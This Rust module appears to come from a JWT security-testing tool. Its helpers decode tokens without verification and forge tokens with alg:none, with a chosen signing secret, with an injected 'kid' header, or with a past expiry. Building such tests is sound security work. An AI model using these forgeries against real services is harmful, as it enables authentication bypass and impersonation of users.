use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use jsonwebtoken::{Algorithm, EncodingKey, Header};

pub(super) fn is_jwt(token: &str) -> bool {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    if let Ok(decoded) = URL_SAFE_NO_PAD.decode(parts[0]) {
        if let Ok(header) = serde_json::from_slice::<serde_json::Value>(&decoded) {
            return header.get("alg").is_some();
        }
    }
    false
}

pub(super) fn decode_jwt_claims(token: &str) -> Option<serde_json::Value> {
    jsonwebtoken::dangerous::insecure_decode::<serde_json::Value>(token)
        .ok()
        .map(|d| d.claims)
}

/// Forges a JWT with alg:none and an empty signature.
/// jsonwebtoken v10 refuses to sign Algorithm::None by design, so we build it manually.
pub(super) fn forge_alg_none(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }
    let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
    Some(format!("{}.{}.", none_header, parts[1]))
}

pub(super) fn forge_signed_token(claims: &serde_json::Value, secret: &str) -> Option<String> {
    jsonwebtoken::encode(
        &Header::default(),
        claims,
        &EncodingKey::from_secret(secret.as_bytes()),
    )
    .ok()
}

/// Forges a JWT with a custom `kid` in the header, signed with HS256 + provided secret.
pub(super) fn forge_jwt_with_kid(original: &str, kid: &str, secret: &[u8]) -> Option<String> {
    let claims = decode_jwt_claims(original)?;
    let mut header = Header::new(Algorithm::HS256);
    header.kid = Some(kid.to_string());
    jsonwebtoken::encode(&header, &claims, &EncodingKey::from_secret(secret))
        .ok()
}

/// Forges an alg:none JWT with `exp` set to a past timestamp.
pub(super) fn forge_expired_token(original: &str) -> Option<String> {
    let parts: Vec<&str> = original.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }

    let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1]).ok()?;
    let mut claims: serde_json::Map<String, serde_json::Value> =
        serde_json::from_slice(&payload_bytes).ok()?;

    // Set exp to 2020-01-01 00:00:00 UTC — clearly in the past
    claims.insert("exp".to_string(), serde_json::json!(1577836800u64));

    let new_payload = URL_SAFE_NO_PAD.encode(serde_json::to_string(&claims).ok()?);
    let none_header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
    Some(format!("{}.{}.", none_header, new_payload))
}
